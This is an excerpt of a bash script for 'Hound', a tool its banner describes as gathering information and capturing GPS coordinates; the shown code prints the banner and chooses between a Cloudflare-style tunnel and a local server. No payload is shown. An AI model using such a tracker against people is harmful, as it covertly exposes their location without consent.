...
banner() {
    ...
    printf '       ██   ██  ██████   ██████  ██   ████ ██████  \n\n'
    printf '\e[1;31m       ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n'
    printf " \e[1;93m      Hound Ver 0.2 - by codebykhan [TechChip]\e[0m \n"
    printf " \e[1;92m      www.techchip.net | youtube.com/techchipnet \e[0m \n"
    printf "\e[1;90m Hound is a simple and light tool for information gathering and capturing GPS coordinates.\e[0m \n"
    printf "\n"
}
...
hound() {
    ...
    if [[ $option_server =~ ^[Yy][Ee][Ss]?$ ]]; then
        cf_server
    else
        local_server
    fi
